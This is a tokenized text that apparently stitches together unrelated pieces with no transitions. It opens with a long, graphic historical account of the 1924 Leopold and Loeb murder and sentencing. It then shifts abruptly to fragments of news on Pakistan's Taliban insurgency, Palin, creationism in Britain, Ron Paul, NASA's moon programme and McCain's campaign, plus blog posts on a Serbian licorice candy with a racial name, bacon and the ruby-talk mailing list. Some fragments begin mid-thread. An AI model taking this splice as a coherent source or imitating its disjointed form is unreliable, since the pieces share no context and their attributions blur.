The boy shook his head — he was almost home .
" No , I can walk . "
" Come on in the car ; I want to talk to you about the tennis racket you had yesterday .
I want to get one for my brother . "
Bobby had moved closer now .
He was standing by the side of the car .
Loeb looked at him through the open window .
Bobby was so close .... Loeb could have grabbed him and pulled him inside , but he continued talking , hoping to persuade the boy to climb into the front seat .
Bobby stepped onto the running board .
The front passenger door was open , inviting the boy inside ... and then suddenly Bobby slid himself into the front seat , next to Leopold .
Loeb gestured toward his companion , " You know Leopold , do n't you ? "
Bobby glanced sideways and shook his head — he did not recognize him .
" No . "
" You do n't mind [ us ] taking you around the block ? "
" Certainly not . "
Bobby turned around in the seat to face Loeb ; he smiled at his cousin with an open , innocent grin , ready to banter about his success in yesterday 's tennis game .
The car slowly accelerated down Ellis Avenue .
As it passed 49th Street , Loeb felt on the car seat beside him for the chisel .
Where had it gone ?
There it was !
They had taped up the blade so that the blunt end — the handle — could be used as a club .
Loeb felt it in his hand .
He grasped it more firmly .
At 50th Street , Leopold turned the car left .
As it made the turn , Bobby looked away from Loeb and glanced toward the front of the car .
Loeb reached over the seat .
He grabbed the boy from behind with his left hand , covering Bobby 's mouth to stop him from crying out .
He brought the chisel down hard — it smashed into the back of the boy 's skull .
Once again he pounded the chisel into the skull with as much force as possible — but the boy was still conscious .
Bobby had now twisted halfway around in the seat , facing back to Loeb , desperately raising his arms as though to protect himself from the blows .
Loeb smashed the chisel down two more times into Bobby 's forehead , but still he struggled for his life .
The fourth blow had gashed a large hole in the boy 's forehead .
Blood from the wound was everywhere , spreading across the seat , splashed onto Leopold 's trousers , spilling onto the floor .
It was inexplicable , Loeb thought , that Bobby was still conscious .
Surely those four blows would have knocked him out ?
Loeb reached down and pulled Bobby suddenly upwards , over the front seat into the back of the car .
He jammed a rag down the boy 's throat , stuffing it down as hard as possible .
He tore off a large strip of adhesive tape and taped the mouth shut .
Finally !
The boy 's moaning and crying had stopped .
Loeb relaxed his grip .
Bobby slid off his lap and lay crumpled at his feet .
Leopold and Loeb had expected to carry out the perfect crime .
But as they disposed of the body — in a culvert at a remote spot several miles south of Chicago — a pair of eyeglasses fell from Leopold 's jacket onto the muddy ground .
Upon returning to the city , Leopold dropped the ransom letter into a post box ; it would arrive at the Franks house at 8 o'clock the next morning .
The following day , a passerby spotted the body and notified the police .
The Franks family confirmed the identity of the victim as that of 14 - year - old Bobby .
The perfect crime had unraveled and now there was no longer any thought , on the part of Leopold and Loeb , of attempting to collect the ransom .
By tracing Leopold 's ownership of the eyeglasses , the state 's attorney , Robert Crowe , was able to determine that Leopold and Loeb were the leading suspects .
Ten days after the murder , on May 31 , both boys confessed and demonstrated to the state 's attorney how they had killed Bobby Franks .
Crowe boasted to the press that it would be " the most complete case ever presented to a grand or petit jury " and that the defendants would certainly hang .
Leopold and Loeb had confessed and shown the police crucial evidence — the typewriter used for the ransom letter — that linked them to the crime .
The trial , Crowe quickly realized , would be a sensation .
Nathan Leopold admitted they had murdered Bobby solely for the thrill of the experience .
( " A thirst for knowledge is highly commendable , no matter what extreme pain or injury it may inflict upon others , " Leopold had told a newspaper reporter .
" A 6 - year - old - boy is justified in pulling the wings from a fly , if by so doing he learns that without wings the fly is helpless . " )
The defendants ' wealth , their intellectual ability , the high regard within Chicago for their families and the capricious nature of the homicide — everything combined to make the crime one of the most intriguing murders in the history of Cook County .
Crowe also realized that he could turn the case to his own advantage .
He was 45 years old , yet already he had had an illustrious career as chief justice of the criminal court and , since 1920 , as state 's attorney of Cook County .
Crowe was a leading figure in the Republican Party with a realistic chance of winning election as Chicago 's next mayor .
To send Leopold and Loeb to the gallows for their murder of a child would , no doubt , find favor with the public .
Indeed , the public 's interest in the trial was driven by more than lurid fascination with the grisly details of the case .
Sometime within the past few years the country had experienced a shift in public morality .
Women now bobbed their hair , smoked cigarettes , drank gin and wore short skirts ; sexuality was everywhere and young people were eagerly taking advantage of their new freedoms .
The traditional ideals — centered on work , discipline and self - denial — had been replaced by a culture of self - indulgence .
And what single event could better illustrate the dangers of such a transformation than the heinous murder of Bobby Franks ?
The evangelical preacher Billy Sunday , passing through Chicago on his way to Indiana , warned that the killing could be " traced to the moral miasma which contaminates some of our ‘ young intellectuals . '
It is now considered fashionable for higher education to scoff at God .... Precocious brains , salacious books , infidel minds — all these helped to produce this murder . "
But while Crowe could count on the support of an outraged public , he faced a daunting adversary in the courtroom .
The families of the confessed murderers had hired Clarence Darrow as defense attorney .
By 1894 , Darrow had achieved notoriety within Cook County as a clever speaker , an astute lawyer and a champion of the weak and defenseless .
One year later , he would become the most famous lawyer in the country , when he successfully defended Socialist labor leader Eugene Debs against conspiracy charges that grew out of a strike against the Pullman Palace Car Company .
Crowe could attest firsthand to Darrow 's skills .
In 1923 , Darrow had humiliated him in the corruption trial of Fred Lundin , a prominent Republican politician .
Like Crowe , Darrow knew that he might be able to play the trial of Leopold and Loeb to his advantage .
Darrow was passionately opposed to the death penalty ; he saw it as a barbaric and vengeful punishment that served no purpose except to satisfy the mob .
The trial would provide him with the means to persuade the American public that the death penalty had no place in the modern judicial system .
Darrow 's opposition to capital punishment found its greatest source of inspiration in the new scientific disciplines of the early 20th century .
" Science and evolution teach us that man is an animal , a little higher than the other orders of animals ; that he is governed by the same natural laws that govern the rest of the universe , " he wrote in the magazine Everyman in 1915 .
Darrow saw confirmation of these views in the field of dynamic psychiatry , which emphasized infantile sexuality and unconscious impulses and denied that human actions were freely chosen and rationally arranged .
Individuals acted less on the basis of free will and more as a consequence of childhood experiences that found their expression in adult life .
How , therefore , Darrow reasoned , could any individual be responsible for his or her actions if they were predetermined ?
Endocrinology — the study of the glandular system — was another emerging science that seemed to deny the existence of individual responsibility .
Several recent scientific studies had demonstrated that an excess or deficiency of certain hormones produced mental and physical alterations in the afflicted person .
Mental illness was closely correlated with physical symptoms that were a consequence of glandular action .
Crime , Darrow believed , was a medical problem .
The courts , guided by psychiatry , should abandon punishment as futile and in its place should determine the proper course of medical treatment for the prisoner .
Such views were anathema to Crowe .
Could any philosophy be more destructive of social harmony than Darrow's ?
The murder rate in Chicago was higher than ever , yet Darrow would do away with punishment .
Crime , Crowe believed , would decline only through the more rigorous application of the law .
Criminals were fully responsible for their actions and should be treated as such .
The stage was set for an epic courtroom battle .
Still , in terms of legal strategy , the burden fell heaviest on Darrow .
How would he plead his clients ?
He could not plead them innocent , since both had confessed .
There had been no indication that the state 's attorney had obtained their statements under duress .
Would Darrow plead them not guilty by reason of insanity ?
Here too was a dilemma , since both Leopold and Loeb appeared entirely lucid and coherent .
The accepted test of insanity in the Illinois courts was the inability to distinguish right from wrong and , by this criterion , both boys were sane .
On July 21 , 1924 , the opening day of court , Judge John Caverly indicated that the attorneys for each side could present their motions .
Darrow could ask the judge to appoint a special commission to determine if the defendants were insane .
The results of an insanity hearing might abrogate the need for a trial ; if the commission decided that Leopold and Loeb were insane , Caverly could , on his own initiative , send them to an asylum .
It was also possible that the defense would ask the court to try each defendant separately .
Darrow , however , already had expressed his belief that the killing was a consequence of each defendant influencing the other .
There was no indication , therefore , that the defense would argue for a severance .
Nor was it likely that Darrow would ask the judge to delay the start of the trial beyond August 4 , its assigned date .
Caverly 's term as chief justice of the criminal court would expire at the end of August .
If the defense requested a continuance , the new chief justice , Jacob Hopkins , might assign a different judge to hear the case .
But Caverly was one of the more liberal justices on the court ; he had never voluntarily sentenced a defendant to death ; and it would be foolish for the defense to request a delay that might remove him from the case .
Darrow might also present a motion to remove the case from the Cook County Criminal Court .
Almost immediately after the kidnapping , Leopold had driven the rental car across the state line into Indiana .
Perhaps Bobby had died outside Illinois and therefore the murder did not fall within the jurisdiction of the Cook County court .
But Darrow had already declared that he would not ask for a change of venue and Crowe , in any case , could still charge Leopold and Loeb with kidnapping , a capital offense in Illinois , and hope to obtain a hanging verdict .
Darrow chose none of these options .
Nine years earlier , in an otherwise obscure case , Darrow had pleaded Russell Pethick guilty of the murder of a 27 - year - old housewife and her infant son but had asked the court to mitigate the punishment on account of the defendant 's mental illness .
Now he would attempt the same strategy in the defense of Nathan Leopold and Richard Loeb .
His clients were guilty of murdering Bobby Franks , he told Caverly .
Nevertheless he wished the judge to consider three mitigating factors in determining their punishment : their age , their guilty plea and their mental condition .
It was a brilliant maneuver .
By pleading them guilty , Darrow avoided a trial by jury .
Caverly would now preside over a hearing to determine punishment — a punishment that might range from the death penalty to a minimum of 14 years in prison .
Clearly it was preferable for Darrow to argue his case before a single judge than before 12 jurors susceptible to public opinion and Crowe 's inflammatory rhetoric .
Darrow had turned the case on its head .
He no longer needed to argue insanity in order to save Leopold and Loeb from the gallows .
He now needed only to persuade the judge that they were mentally ill — a medical condition , not at all equivalent or comparable to insanity — to obtain a reduction in their sentence .
And Darrow needed only a reduction from death by hanging to life in prison to win his case .
And so , during July and August 1924 , the psychiatrists presented their evidence .
William Alanson
White , the president of the American Psychiatric Association , told the court that both Leopold and Loeb had experienced trauma at an early age at the hands of their governesses .
Loeb had grown up under a disciplinary regimen so exacting that , in order to escape punishment , he had had no other recourse but to lie to his governess , and so , in White 's account at least , he had been set on a path of criminality .
" He considered himself the master criminal mind of the century , " White testified , " controlling a large band of criminals , whom he directed ; even at times he thought of himself as being so sick as to be confined to bed , but so brilliant and capable of mind ...[ that ] the underworld came to him and sought his advice and asked for his direction . "
Leopold also had been traumatized , having been sexually intimate with his governess at an early age .
Other psychiatrists — William Healy , the author of The Individual Delinquent , and Bernard Glueck , professor of psychiatry at the New York Postgraduate School and Hospital — confirmed that both boys possessed a vivid fantasy life .
Leopold pictured himself as a strong and powerful slave , favored by his sovereign to settle disputes in single - handed combat .
Each fantasy interlocked with the other .
Loeb , in translating his fantasy of being a criminal mastermind into reality , required an audience for his misdeeds and gladly recruited Leopold as a willing participant .
Leopold needed to play the role of the slave to a powerful sovereign — and who , other than Loeb , was available to serve as Leopold 's king ?
Crowe had also recruited prominent psychiatrists for the prosecution .
They included Hugh Patrick , president of the American Neurological Association ; William Krohn and Harold Singer , authors of Insanity and the Law : A Treatise on Forensic Psychiatry ; and Archibald Church , professor of mental diseases and medical jurisprudence at Northwestern University .
All four testified that neither Leopold nor Loeb displayed any sign of mental derangement .
They had examined both prisoners in the office of the state 's attorney shortly after their arrest .
" There was no defect of vision , " Krohn testified , " no defect of hearing , no evidence of any defect of any of the sense paths or sense activities .
There was no defect of the nerves leading from the brain as evidenced by gait or station or tremors . "
Each set of psychiatrists — one for the state , the other for the defense — contradicted the other .
Few observers noticed that each side spoke for a different branch of psychiatry and was , therefore , separately justified in reaching its verdict .
The expert witnesses for the state , all neurologists , had found no evidence that any organic trauma or infection might have damaged either the cerebral cortex or the central nervous system of the defendants .
The conclusion reached by the psychiatrists for the prosecution was , therefore , a correct one — there was no mental disease .
The psychiatrists for the defense — White , Glueck and Healy — could assert , with equal justification , that , according to their understanding of psychiatry , an understanding informed by psychoanalysis , the defendants had suffered mental trauma during childhood that had damaged each boy 's ability to function competently .
The result was compensatory fantasies that had led directly to the murder .
Most commentators , however , were oblivious to the epistemological gulf that separated neurology from psychoanalytic psychiatry .
The expert witnesses all claimed to be psychiatrists , after all ; and it was , everyone agreed , a dark day for psychiatry when leading representatives of the profession could stand up in court and contradict each other .
If men of national reputation and eminence could not agree on a common diagnosis , then could any value be attached to a psychiatric judgment ?
Or perhaps each group of experts was saying only what the lawyers required them to say — for a fee , of course .
It was an evil that contaminated the entire profession , thundered the New York Times , in an editorial similar to dozens of others during the trial .
The experts in the hearing were " of equal authority as alienists and psychiatrists , " apparently in possession of the same set of facts , who , nevertheless , gave out " opinions exactly opposite and contradictory as to the past and present condition of the two prisoners ....
Instead of seeking truth for its own sake and with no preference as to what it turns out to be , they are supporting , and are expected to support , a predetermined purpose .... That the presiding Judge , " the editorial writer concluded sorrowfully , " is getting any help from those men toward the forming of his decision hardly is to be believed . "
At 9:30 on the morning of September 10 , 1924 , Caverly prepared to sentence the prisoners .
The final day of the hearing was to be broadcast live over station WGN , and throughout the city , groups of Chicagoans clustered around radio sets to listen .
The metropolis had paused in its morning bustle to hear the verdict .
Caverly 's statement was brief .
In determining punishment , he gave no weight to the guilty plea .
Normally a guilty plea could mitigate punishment if it saved the prosecution the time and trouble of demonstrating culpability ; but that had not been the case on this occasion .
The psychiatric evidence also could not be considered in mitigation .
The defendants , Caverly stated , " have been shown in essential respects to be abnormal ....
The careful analysis made of the life history of the defendants and of their present mental , emotional and ethical condition has been of extreme interest ....
And yet the court feels strongly that similar analyses made of other persons accused of crime would probably reveal similar or different abnormalities ....
For this reason the court is satisfied that his judgment in the present case cannot be affected thereby . "
Nathan Leopold and Richard Loeb had been 19 and 18 years old , respectively , at the time of the murder .
Did their youth mitigate the punishment ?
The prosecuting attorneys , in their concluding statements to the court , had emphasized that many murderers of similar age had been executed in Cook County ; and none had planned their deeds with as much deliberation and forethought as Leopold and Loeb .
It would be outrageous , Crowe had argued , for the prisoners to escape the death penalty when others — some even younger than 18 — had been hanged .
Yet , Caverly decided he would hold back from imposing the extreme penalty on account of the age of the defendants .
He sentenced each defendant to 99 years for the kidnapping and life in prison for the murder .
" The court believes , " Caverly stated , " that it is within his province to decline to impose the sentence of death on persons who are not of full age .
This determination appears to be in accordance with the progress of criminal law all over the world and with the dictates of enlightened humanity . "
The verdict was a victory for the defense , a defeat for the state .
The guards allowed Leopold and Loeb to shake Darrow 's hand before escorting the prisoners back to their cells .
Two dozen reporters crowded around the defense table to hear Darrow 's response to the verdict and , even in his moment of victory , Darrow was careful not to seem too triumphal : " Well , it 's just what we asked for but ... it's pretty tough . "
He pushed back a lock of hair that had fallen over his forehead , " It was more of a punishment than death would have been . "
Crowe was furious at the judge 's decision .
In his statement to the press , Crowe made sure everyone knew whom to blame : " The state 's attorney 's duty was fully performed .
He is in no measure responsible for the decision of the court .
The responsibility for that decision rests with the judge alone . "
Later that evening , however , Crowe 's rage would emerge in full public view , when he issued another , more inflammatory statement : " [ Leopold and Loeb ] had the reputation of being immoral ... degenerates of the worst type ....
The evidence shows that both defendants are atheists and followers of the Nietzschean doctrines ... that they are above the law , both the law of God and the law of man ....
It is unfortunate for the welfare of the community that they were not sentenced to death . "
As for Nathan Leopold and Richard Loeb , their fates would take divergent paths .
In 1936 , inside Stateville Prison , James Day , a prisoner serving a sentence for grand larceny , stabbed Loeb in the shower room and despite the best efforts of the prison doctors , Loeb , then 30 years old , died of his wounds shortly afterward .
Leopold served 33 years in prison until he won parole in 1958 .
At the parole hearing , he was asked whether he realized that every media outlet in the country would want an interview with him .
Already there was a rumor that Ed Murrow , the CBS correspondent , wanted him to appear on his television show " See It Now . "
" I do n't want any part of lecturing , television or radio , or trading on the notoriety , " Leopold replied .
The confessed murderer who had once deemed himself a superman stated , " All I want , if I am so lucky as to ever see freedom again , is to try to become a humble little person . "
Upon his release , Leopold moved to Puerto Rico , where he lived in relative obscurity , studying for a degree in social work at the University of Puerto Rico , writing a monograph on the birds of the island , and , in 1961 , marrying Trudi Garcia de Quevedo , the expatriate widow of a Baltimore physician .
During the 1960s , Leopold was finally able to travel to Chicago .
He returned to the city often , to see old friends , to tour the South Side neighborhood near the university and to place flowers on the graves of his mother and father and two brothers .
It had been so long ago — that summer of 1924 , in the stuffy courtroom on the sixth floor of the Cook County Criminal Court — and now he was the sole survivor .
The crime had passed into legend ; its thread had been woven into the tapestry of Chicago 's past ; and when Nathan Leopold , at age 66 , died in Puerto Rico of a heart attack on August 29 , 1971 , the newspapers wrote of the murder as the crime of the century , an event so inexplicable and so shocking that it would never be forgotten .

Another central concern is the war in Afghanistan , which has been fueled by Taliban and Qaeda fighters who have used Pakistan as a rear base to carry out increasingly lethal and sophisticated attacks across the border .
After years in which Mr. Musharraf proved unable or unwilling to rein in militants in Pakistan , American officials say they are now more skeptical than ever that they can count on cooperation from Pakistan ’s military leaders , even including Gen.
Ashfaq Parvez Kayani , a former head of Pakistan ’s spy agency , who replaced Mr. Musharraf as military chief last November .
The coalition government had “ no comprehension ” of the insurgency , said a former interior minister , Aftab Ahmed Khan Sherpao , whose parliamentary constituency adjoins the tribal areas .
“ They have one policy for domestic consumption : ‘ Have peace , do n’t use the army , ’ ” he said .
“ Then for the foreigners they say , ‘ We will fight . ’ ”

A main challenge for Washington now will be to fix the attention of the two leaders of the coalition parties , Asif Ali Zardari and Nawaz Sharif , on the raging Taliban insurgency that not only threatens American soldiers in Afghanistan but also threatens to destabilize Pakistan itself .
The campaign against the militants is unpopular here in Pakistan because it is seen as an American conflict foisted on the country .
Washington would like the new government to explain to the public that the effort to quell the Taliban is in Pakistan ’s interests as well .
So far , the coalition , distracted by internal machinations , has failed to make that case , even as the military has taken on the insurgents with new vigor in the last 10 days .
Secretary of State Condoleezza
Rice sought on Monday to emphasize continuity with the new leaders of Pakistan , saying the United States would keep pressing the Pakistani government to battle extremism within its borders .
Bloomberg :
“ She ’s not qualified , she does n’t have the judgment , to be next in line to the president of the United States , ” Larry Persily , who until June worked in the governor ’s Washington office as a congressional liaison , said in a phone interview yesterday .
A supporter of Palin ’s campaign for governor , Jim Whitaker , the Republican mayor of Fairbanks , also questioned Palin ’s readiness to serve as vice president in a phone interview yesterday .
` Avid Supporter ’
Whitaker said that while he is “ still an avid supporter ” of Palin as governor , he will continue to back Democratic presidential nominee Barack Obama .
The rise of creationism in Britain to the point where four out of 10 Britons believe it to be the literal truth – as well as the idea being taught in state - approved schools – has spread alarm throughout the scientific community .
But this week sees the start of a concerted fightback , as an 18 - month celebration of evolution and its greatest proponent , Charles Darwin , gets under way , marking the 150th anniversary of the unveiling of his theory and the 200th anniversary of his birth .
People all over Europe will take part in a mass experiment to discover evolutionary changes to a species of snail ; a major series of programmes is to be shown by the BBC ; several books are to be published ; and the Open University plans a new course on the subject .

Entries for a competition to design " Darwin's Canopy " – a piece of art to cover a ceiling in the Natural History Museum – will be unveiled this week , and the museum will hold a major exhibition on Darwin beginning in November .
Dr Bob Bloomfield , head of special projects at the museum and a key figure in the " Darwin200 " project , said he was concerned by the prevalence of creationist ideas .
" The statistics in this country are quite frightening .
If you add up the percentages that either believe in creationism or intelligent design , it is approaching 40 per cent , " he said .
" I do n't think society can be complacent when ideas which are unsound are perpetrated .
We are trying not to compromise people 's faith views , other than where they are absolutely inconsistent with science . "
He said the teaching of creationism in schools was " very problematic " .
Professor Jonathan Silvertown of the Open University , who is writing a book entitled 99 % Ape : How Evolution Adds Up , said the OU would be running a course called Darwin and Evolution .
" The idea is to give people a feel for the modern evidence , " he said .
He and the geneticist Professor Steve Jones , of University College London , are involved in a mass science project to study changes in banded snails , by recruiting tens of thousands of people across Europe .
Professor Jones said religious students – even those studying medicine – were becoming increasingly vocal in their opposition to evolution , saying he was " telling lies and insulting people 's religion " by teaching the subject .
" They want permission not to come to those lectures and sit those exam questions , " he said .
" I have been teaching genetics and evolutionary biology for 30 years and for the first 20 I think the issue arose once .
That 's changed . "
WASHINGTON ( Reuters ) - As Republicans gather to nominate John McCain for president in St. Paul next week , do n’t expect former rival Ron Paul to cheer him on .
Ron Paul speaks at the American Conservative Union 's 2008 Conservative Political Action Conference at the Omni Shoreham Hotel in Washington February 7 , 2008 .

Unlike other former candidates like Mitt Romney and Mike Huckabee , the libertarian - leaning Texas congressman was n’t given a speaking slot at the convention -- in fact , he says the McCain campaign tried to bar him from the convention floor entirely .
“ I did n’t expect much and I did n’t get much , because they do n’t want somebody there who will emphasize where they ’re coming short , ” he said in an interview .
Instead ,
Paul plans a rally of his own at a basketball arena across the river in Minneapolis , along with training sessions for his supporters who want to more effectively push the Republican party toward his antiwar , small - government ideals .
“ They ’re lining up for the next fight , and they ’re going to have better numbers and they ’re going to know the rules better , ” he said .
But Paul said he would not endorse anyone seeking to challenge Republican incumbents in Congress .
“ It ’s just not the kind of thing I think I should do , ” he said .
“ There ’s a certain political comfort of just getting along with people . ”
Paul ’s opposition to the Iraq war drew sharp rebukes from his fellow Republican presidential candidates at debates in 2007 and earlier this year .
He attracted a passionate , net - savvy following that helped his presidential campaign raise a surprising $ 35 million , but he did not win any state nominating contests and formally abandoned his campaign in June , months after McCain had locked up the nomination .
Paul has refused to endorse McCain and said he wo n’t vote for the Arizona senator or his Democratic rival , Illinois Sen. Barack Obama , in the November 4 election .
Instead , he ’s considering third - party candidates , though he said he wo n’t tell his followers who they should vote for .
A former Libertarian Party presidential candidate in 1988 , Paul offered praise for this year ’s Libertarian candidate , former Georgia Republican Rep. Bob Barr .
“ It ’s sort of like asking me if there ’s a better person than myself to deliver the message I tried to deliver , and I say sure , there ’s probably plenty , ” he said .
“ I think he does a good job . ”
Paul also praised another third - party candidate , Chuck Baldwin of the Constitution Party .
Paul is not likely to affect the outcome of the election , said Southern Methodist University professor Cal Jillson .
“ The people who are most committed to him tend to be principally small - government , traditional Republicans , who may well sit this election out because John McCain does not support their positions , ” Jillson said .
Paul remains committed to his views .
A longtime advocate of abolishing the Federal Reserve , he said that even if the central bank has kept the economy from tumbling into recession , it will only prolong the pain by making credit too easily available .
He said regulation has made the housing crisis worse .
“ It ’s also the so - called affirmative action programs that the government passes to say , ‘ Well , you must make loans to certain people that want to buy houses , ’ ” he said .
“ We need less regulation by the government , but more regulation by the market . ”
What ’s in a label ?
Apparently a lot according to an African American teenager who got served a Negro candy as a gesture of good will by an unsuspecting immigrant man .
Negro is a hard licorice candy .
I hated them as a kid .
They taste like turpentine and feel like chewing glass beads that just wo n’t go away .
Go away they wo n’t .
They ’ve been making them for eighty five years in Serbia .
The wrapper design has been updated a bit since I ’ve been a kid but it still has that old world sensibility .
Chimneys and candy do n’t mix .
The tagline under the big red “ NEGRO ” reads “ THROAT CHIMNEY SWEEPER . ” Delicious .
The lower left seal claims “ THE ONE AND ONLY GENUINE . ”
There is a less - than - genuine Hungarian knockoff also called Negro .
See the picture of a man holding a bag of copycat Negroes at the bottom .
The clipping above is from one of my favorite news stories ever .
It was reported in a local paper around 2003 .
The pictured girl was trick - or - treating and a Yugoslav refugee gave her some Negro candy .
The girl saw this as a racial insult and went away crying .
I ca n’t say that I know more about the incident than was reported .
It ’s hard to believe that the non-English speaking immigrant was intentionally racist .
The man was simply trying to conform to the odd American custom of trick - or - treating the best way he could .
He probably thought that the local kids would enjoy some imported ( yet foul ) tasting candy .
I visited the manufacturers website .
It ’s very slick but it ’s weird .
It uses industrial language like “ hard molded candy ” and “ product specifications ” which comes at no surprise since they have a chimney on the wrapper .
I ’d guess the incident with the teenager was a case of cultural misunderstanding .
You ’d go nuts if you started taking brand names apart .

The technology storehouse supporting NASA 's effort to launch astronauts back to the moon by 2020 is dependent on proper funding and clear mission goals , but lacks a comprehensive testing plan , according to a new report .
Released Thursday by the National Research Council , the 158 - page report stemmed from a 10 - month review of NASA 's Exploration Technology Development Program ( EDTP ) , which is charged with developing and providing the new technologies required for the agency 's return to the moon and beyond .
NASA currently plans to retire its three aging space shuttles by 2010 after completing construction of the International Space Station .
Their replacement , the Orion Crew Exploration Vehicle , is slated to make its first crewed flight no earlier than 2014 atop the new Ares I rocket .
" We need a little more time to digest it , " said NASA spokesperson Gray Hautaluoma at the agency 's headquarters in Washington , D.C. , of the report .
" We always are appreciative of any analysis and advice . "
A committee of 25 veteran aerospace experts took part in the independent review — entitled " A Constrained Space Technology Development Program " — which found that NASA 's 22 - project technology development program is making progress toward its goals to support the agency 's moon effort .
But there was room for improvement , particularly in communicating the risks and human health factors associated with new technologies , as well as with longer term projects aimed at reaching past the moon to Mars and beyond .
Other hurdles include federal budget limitations and shifting requirements of NASA 's Constellation program overseeing the development of Orion , Ares I , the new Altair lunar lander and its heavy - lift Ares V rocket .
" This was and is a resource - challenged technology development program , but that technology is necessary for future human exploration , " said former astronaut Bonnie Dunbar , president CEO of the Museum of Flight in Seattle who co-chaired the review committee .
" Even the most talented of engineers and scientists will find it difficult to make forward progress without the necessary tools to do so . "
The review also stressed the lack of an integrated test program for several EDTP projects " that are needed to advance the technology to technology readiness level . "
Because of NASA 's short - term focus on returning to the moon and limiting the gap between the space shuttle retirement and the first operational Orion flights , the agency has canceled some longer - term programs — such as nuclear thermal rocket propulsion — that could be important for long range missions to Mars , the report stated .
More progress on the effectiveness of technology that will allow astronauts to battle pervasive moon dust , tap into off - planet resources and monitor their environment is also required , it went on .
Dunbar said that while the committee worked hard to provide an objective assessment , it does firmly support the national vision to continue human space exploration to the moon and Mars .
" We hope that this report will help to strengthen that road to the future , not cause it to be questioned , " she said in an e-mail interview .
Hautaluoma told SPACE.com that NASA officials will meet with the NRC review panel to further discuss their findings at a later date .
The NRC report is the second in as many weeks stressing the need for more stable federal funding and requirements for NASA 's Constellation program .
An earlier report , released Aug. 11 by the independent Aerospace Safety Advisory Panel , stressed that budget limitations and the lack of a clear direction for the Constellation program posed significant challenges for the project .
NASA Constellation program managers said then that it was primarily budget concerns that prompted the agency to push back its internal target for the first crewed launch of Orion by one year to 2014 .
The space agency remains confident that its Orion shuttle successor will meet its official deadline to begin operational flights into orbit no later than 2015 , they added .

I saw this sign in Union Square last night :
I love bacon , do n’t get me wrong — but I wonder sometimes if it ’s like zombies and robots and monkeys online — awesome , sure , but also just this stuff the Internet fetishizes just to be fetishizing something .
I mean , as cool as I think robots are in the abstract , I ’m not actually that thrilled about having a world crawling with them .
I just like looking at them and writing about them .
Is bacon the internet ’s meat robots ?
According to Eliza , hell no :
Bacon is the number one meat that vegetarians miss , and the one that eventually breaks most of them .
She ’s right .
I never could be a vegetarian in the first place — could n’t give up bacon .
Working as I do in the Rails world these days , I ’m periodically reminded of the difference between me and most Rails programmers .
That is , the fact that I came to Rails via Ruby , rather than vice - versa .
Usually this happens when someone at work or in the blog world expresses delight ( or perplexity ) about some Ruby feature that I thought everyone knew about .
This then prompts me to put on my best “ old coot ” voice and ramble on about “ young whippersnappers ” with their Rails and their fancy conferences and their big pants and … get off my lawn , ya darned kids !
One of the biggest disconnects for me is the fact that almost no one I know in the Railsverse reads “ ruby - talk ” : http://blade.nagaokaut.ac.jp/ruby/ruby-talk/index.shtml regularly .
Having gotten into Ruby somewhere between five and seven years ago , it ’s difficult for me to imagine being a part of the Ruby community and not being privy to the discussions in ruby - talk .
Ruby - talk was one of the first programming communities I ever regularly participated in ( the other one was the Pragmatic Programmer mailing list ) .
It was a warm and welcoming place compared to , say , the Perl communities of the time ; full of the spirit of joyous discovery and show - and - tell that this amazing new language from Japan tended to inspire .
The S/N ratio has declined somewhat since some joker hooked up a conduit between “ ruby - forum ” : http://www.ruby-forum.com/forum/4 and the mailing list , leading in a steady stream of Rails newbies who have it confused with the RoR forum .
But it ’s still one of the friendliest and most helpful programming communities out there .
And nowhere else – not on blogs , not on Reddit , nor on Twitter – will you find better and more thoughtful discussions on Ruby style , idioms , alternate ways of accomplishing tasks , gotchas , and just plain fun Ruby tricks .
And , because new Ruby libraries and frameworks are usually announced there , it ’s also a great place to find out about what ’s going on in the wider Ruby universe – beyond Rails , beyond web development entirely .
I ’m going to make a bold statement here :
If you are a developer working in Ruby , you should be reading ruby - talk .
No , let me amend that :
If you are a developer working in Ruby , you should be - reading - contributing to ruby - talk .
Because apart from being a great place to pick up new techniques , it ’s also one of the easiest opportunities to give back to the Ruby community .
Check in from time to time , and if a newbie asks a simple question you know the answer to , help them out !
It takes five minutes , and it helps perpetuate the culture of supportiveness that is a big part of what makes Ruby so special .
It ’s easy to get involved with ruby - talk .
There are multiple interfaces .
There is the “ mailing list itself ” : http://blade.nagaokaut.ac.jp/ruby/ruby-talk/index.shtml, which is how I interact with it .
Then there is the mail - to - news gateway , which enables you to read it as the Usenet newsgroup comp.lang.ruby .
You can get to it through “ Gmane ” : nntp://news.gmane.org if your ISP does n’t provide NNTP service .
Or you can interact via the “ Google Groups frontend ” : http://groups.google.com/group/ruby-talk-google.
And finally , there ’s the aforementioned “ ruby - forum gateway ” : http://www.ruby-forum.com/forum/4.
Whichever route you choose , I hope to see you on ruby - talk soon !
His management of his campaign offers a glimpse of how he might run the White House .
He would , it appears , be a president who is intensely interested in issues ( particularly foreign affairs ) and open to conflicting opinions , but also impetuous at times and tolerant of the kind of internal churning that can impede orderly decision - making and keep aides on edge .
While President Bush has been criticized for being too insular and too slow to adapt to changing circumstances , Mr. McCain ’s leadership of his campaign suggests a less hierarchical , more free - form style , much closer to that of President Bill Clinton .
For now , Mr. McCain ’s executive style looms as a potential obstacle to his hopes of getting to the White House .
His campaign has been rocked by personnel changes and often well - publicized differences .
And for all the efforts to maintain discipline , he continues to be plagued by misstatements and apparent gaffes as he at times bucks what his own campaign is trying to do .
After his campaign spent days mocking Mr. Obama for suggesting that proper tire pressure was one way of conserving fuel , Mr. McCain undercut the message , stating : “ Senator Obama a couple of days ago said that we ought to all inflate our tires , and I do n’t disagree with that .
The American Automobile Association strongly recommends it . ”
As Mr. Obama ’s campaign pounced on the remark , the McCain campaign quickly sent out an e-mail message to reporters noting that Mr. McCain had gone on to say that he did not believe that would lead to energy independence .
By all accounts , the most recent shake - up of his campaign has helped .
It put Steve Schmidt  known for a tough management style and who made clear he would leave if he was not given the authority to impose discipline  in a senior role at headquarters , working alongside Rick Davis , a longtime survivor of the McCain staff wars .
Mr. Schmidt has sought to cut down on Mr. McCain ’s use of his cellphone and limit the people who have regular access to Mr. McCain in an effort to keep him more focused , advisers said .
He has been the impetus for an effort by Mr. McCain to limit sharply his engagements with reporters , the kind of freewheeling encounters that Mr. McCain enjoys  and that helped him charm the news media for years  but that often lead him to veer from his campaign ’s message of the day .
There are 8 a.m. calls every day in which the campaign settles on the daily message or attack .
Someone in Mr. McCain ’s entourage  typically Nicolle Wallace , a Schmidt ally and a veteran of Mr. Bush ’s 2004 campaign and White House who recently joined the campaign as a traveling senior adviser  is given the responsibility of making sure Mr. McCain agrees to the message and tries to stick to it .
